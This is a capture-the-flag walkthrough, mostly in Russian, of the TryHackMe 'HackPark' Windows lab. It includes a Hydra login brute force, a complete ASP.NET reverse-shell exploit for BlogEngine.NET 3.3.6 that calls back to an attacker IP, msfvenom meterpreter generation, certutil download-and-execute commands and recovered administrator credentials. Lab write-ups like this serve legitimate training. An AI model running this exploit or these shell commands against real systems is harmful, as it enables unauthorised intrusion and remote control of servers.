# TryHackMe - Win Medium - HackPark

📅 Дата: 2025-07-04  
🧠 Сложность: Medium  
💻 IP-адрес: 10.10.53.26  

---

## Sugar

```bash
nmap_ctf() {
  local ip=$1
  sudo nmap -sS -p- -n --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
}
```


## 🔍 Сканирование

```bash
export ip=10.10.53.26 && nmap_ctf $ip
```

🖼️ Nmap скан:

```bash
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
|_http-title: hackpark | hackpark amusements
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hackpark
| Issuer: commonName=hackpark
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-07-03T09:05:56
| Not valid after:  2026-01-02T09:05:56
| MD5:   1833:f9a1:7702:db27:fe1c:8dba:9fc6:865d
|_SHA-1: 7a88:0c48:18aa:4533:f156:db6e:54d3:df39:08c0:ae09
|_ssl-date: 2025-07-04T09:19:49+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2025-07-04T09:19:44+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Uptime guess: 0.010 days (since Fri Jul  4 05:05:03 2025)
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

---

## 🕵️ Enumeration

Login Brute with Hydra
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - HackPark/scans]
└─$ hydra -l admin -P /media/sf_Exchange/Dictionaries/rockyou.txt -t 40 $ip -s 80 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=jmeTjZ7PmcvuwStr2W3ZM9I%2Bkd6PnFk2WtONu1UQsZ%2BAht2wl0LIZPECnY%2Bsq%2FQiakuMzkzTMsVdJwi7KdLTHJ4D9hXEMVFlkONCD%2FySW8pKNDK7rzHbWfgm9ypeAy1K2SAS3DAivKVIoi4q9AP7EAUF4ueYfPzNPh2ecNwtRCr2Zwam&__EVENTVALIDATION=fRGCMUKDt8RMmdUcD%2F8T3Z3q8oVlLsbt8js6skEXr494OrEbp894EcmAg05GcsS%2FzoceQhhTYuUWzh2lEyQ03QX65nz4AvB798HRR%2F%2BJ%2FYo84%2B8vxQfETylrP3FauP6xcDhW57d64TFIGSUaw5FRol8h5s7RIMhAvv%2BH%2FTQPbald7P%2BY&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24RememberMe=on&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-04 05:25:16
[DATA] max 40 tasks per 1 server, overall 40 tasks, 14344398 login tries (l:1/p:14344398), ~358610 tries per task
[DATA] attacking http-post-form://10.10.53.26:80/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=jmeTjZ7PmcvuwStr2W3ZM9I%2Bkd6PnFk2WtONu1UQsZ%2BAht2wl0LIZPECnY%2Bsq%2FQiakuMzkzTMsVdJwi7KdLTHJ4D9hXEMVFlkONCD%2FySW8pKNDK7rzHbWfgm9ypeAy1K2SAS3DAivKVIoi4q9AP7EAUF4ueYfPzNPh2ecNwtRCr2Zwam&__EVENTVALIDATION=fRGCMUKDt8RMmdUcD%2F8T3Z3q8oVlLsbt8js6skEXr494OrEbp894EcmAg05GcsS%2FzoceQhhTYuUWzh2lEyQ03QX65nz4AvB798HRR%2F%2BJ%2FYo84%2B8vxQfETylrP3FauP6xcDhW57d64TFIGSUaw5FRol8h5s7RIMhAvv%2BH%2FTQPbald7P%2BY&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24RememberMe=on&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed
[80][http-post-form] host: 10.10.53.26   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-04 05:26:15
```

Creds are 
login: **admin**   password: **1qaz2wsx**



## 📂 Получение доступа

Exploit для BlogEngine.NET <= 3.3.6 Directory Traversal RCE
```
<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
	static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

	using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.21.104.16", 4444)) {
		using(System.IO.Stream stream = client.GetStream()) {
			using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
				streamWriter = new System.IO.StreamWriter(stream);
						
				StringBuilder strInput = new StringBuilder();

				System.Diagnostics.Process p = new System.Diagnostics.Process();
				p.StartInfo.FileName = "cmd.exe";
				p.StartInfo.CreateNoWindow = true;
				p.StartInfo.UseShellExecute = false;
				p.StartInfo.RedirectStandardOutput = true;
				p.StartInfo.RedirectStandardInput = true;
				p.StartInfo.RedirectStandardError = true;
				p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
				p.Start();
				p.BeginOutputReadLine();

				while(true) {
					strInput.Append(rdr.ReadLine());
					p.StandardInput.WriteLine(strInput);
					strInput.Remove(0, strInput.Length);
				}
			}
		}
    	}
    }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
   	StringBuilder strOutput = new StringBuilder();

       	if (!String.IsNullOrEmpty(outLine.Data)) {
       		try {
                	strOutput.Append(outLine.Data);
                    	streamWriter.WriteLine(strOutput);
                    	streamWriter.Flush();
                } catch (Exception err) { }
        }
    }

</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
```

Загрузка эксплойта
![x_upload](screenshots/01.upload.x.png)

Перейдя по url "http://10.10.10.10/?theme=../../App_Data/files" получаю reverse от iis
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - HackPark/exploits]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.21.104.16] from (UNKNOWN) [10.10.50.38] 49239
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```


## ⚙️ Привилегии

Получаю немного информации о системе, чтобы сгенерировать правильную полезную нагрузку
```bash
set pro
c:\windows\system32\inetsrv>set pro
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
PROCESSOR_LEVEL=6
PROCESSOR_REVISION=4f01
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
```

И генерирую с помощью msfvenom
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - HackPark/exploits]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.21.104.16 LPORT=5555 -f exe -o meter-5555.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: meter-5555.exe
```

Из директории с оболочкой meterpreter запускаю сервер
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - HackPark/exploits]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

Перемещаюсь в директорию с возможностью записи и скачиваю на жертву meter-5555.exe
```bash
c:\Users\Public>certutil -urlcache -f http://10.21.104.16:8888/meter-5555.exe meter-5555.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
dir
c:\Users\Public>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of c:\Users\Public
07/04/2025  06:01 AM    <DIR>          .
07/04/2025  06:01 AM    <DIR>          ..
08/22/2013  08:39 AM    <DIR>          Documents
08/22/2013  08:39 AM    <DIR>          Downloads
07/04/2025  06:01 AM            73,802 meter-5555.exe
08/22/2013  08:39 AM    <DIR>          Music
08/22/2013  08:39 AM    <DIR>          Pictures
08/22/2013  08:39 AM    <DIR>          Videos
               1 File(s)         73,802 bytes
               7 Dir(s)  39,125,962,752 bytes free
```

Выполняю на жертве **.\meter-5555.exe** и ловлю meterpreter в msfconsole
```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.21.104.16:5555 
[*] Sending stage (176198 bytes) to 10.10.50.38
[*] Meterpreter session 1 opened (10.21.104.16:5555 -> 10.10.50.38:49271) at 2025-07-04 09:04:45 -0400

meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

Загружаю winPEAS
```bash
certutil -urlcache -f http://10.21.104.16:8888/winPEASx64.exe winPEASany.exe
```

Нахожу такой сервис
![x_service](screenshots/02.service.png)

Среди прочего
```powershell
    Some AutoLogon credentials were found
    DefaultUserName               :  administrator
    DefaultPassword               :  4q6XvFES7Fdxs
```

```bash
    Some AutoLogon credentials were found
    DefaultUserName               :  administrator
    DefaultPassword               :  4q6XvFES7Fdxs
```


## 🏁 Флаги

- User flag: 
- Root flag: 

---

## 📋 Резюме

🧰 **Инструменты:**
  - nmap, ffuf, и др.

🚨 **Уязвимости, которые удалось обнаружить:**  
  - Directory Traversal  
  - RCE через уязвимый скрипт  

🛡 **Советы по защите:**
  - Использовать сложные пароли и ограничить число попыток входа
  - Обновлять ПО до актуальных версий
  - Удалять/ограничивать использование SUID-бинарников
  - Настроить логирование и мониторинг системных событий
  - Применять принцип наименьших привилегий


